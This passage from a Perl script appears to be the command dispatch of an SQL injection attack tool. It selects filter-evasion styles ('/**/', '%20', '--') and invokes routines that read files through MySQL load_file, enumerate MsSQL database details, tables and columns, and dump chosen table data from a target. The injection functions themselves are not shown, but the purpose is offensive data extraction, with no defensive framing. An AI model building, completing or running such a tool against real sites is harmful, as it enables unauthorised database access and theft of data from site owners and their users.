             print "[+] Evasion : --\n" ;
             $evasion = "--"
         }
         mysqlfile($mysql_load_file,$evasion,$word_list);     
     }
}

if (defined($mssql_details_target))
{
     print "[+] MsSQL DB Details\n\n" ;
     print "[+] Target : $mssql_details_target\n" ;
     if ($evasion eq '/*')
     {
         print "[+] Evasion : /**/\n" ;
     }
     elsif ($evasion eq '%20')
     {
         print "[+] Evasion : %20\n" ;
     }
     else
     {
         print "[+] Evasion : --\n" ;
         $evasion = "--"
     }
     mssqldetails($mssql_details_target,$evasion);     
}

if (defined($mssql_table_target))
{
     print "[+] MsSQL Tables Extractor\n\n" ;
     print "[+] Target : $mssql_table_target\n" ;
     if ($evasion eq '/*')
     {
         print "[+] Evasion : /**/\n" ;
     }
     elsif ($evasion eq '%20')
     {
         print "[+] Evasion : %20\n" ;
     }
     else
     {
         print "[+] Evasion : --\n" ;
         $evasion = "--"
     }
     mssqltable($mssql_table_target,$evasion);     
}

if (defined($mssql_column_target))
{
     if(!defined($sql_dump_table))
     {
         print "[!] Please Defind At Least A Table do Extract from\n";
         exit();
     }
     else
     {
         print "[+] MsSQL Columns Extractor\n\n" ;
         print "[+] Target : $mssql_column_target\n" ;
         if ($evasion eq '/*')
         {
             print "[+] Evasion : /**/\n" ;
         }
         elsif ($evasion eq '%20')
         {
             print "[+] Evasion : %20\n" ;
         } 
         else
         {
             print "[+] Evasion : --\n" ;
             $evasion = "--"
         }
         mssqlcolumn($mssql_column_target,$evasion,$sql_dump_table);     
     }
}

if (defined($mssql_dump_target))
{
     if(!defined($sql_dump_table))
     {
         print "[!] Please Defind At Least A Table\n";
         exit();
     }
     elsif(!defined($sql_dump_column))
     {
         print "[!] Please Defind At Least A Column\n";
         exit();
     }
     else
     {
         print "[+] MsSQL Data Dumper\n\n" ;
         print "[+] Target : $mssql_dump_target\n" ;
         if ($evasion eq '/*')
         {
             print "[+] Evasion : /**/\n" ;
         }
         elsif ($evasion eq '%20')
         {
             print "[+] Evasion : %20\n" ;
         } 
         else
         {
             print "[+] Evasion : --\n" ;
             $evasion = "--"
         }
         mssqldump($mssql_dump_target,$evasion,$sql_dump_table,$sql_dump_column);     
     }
}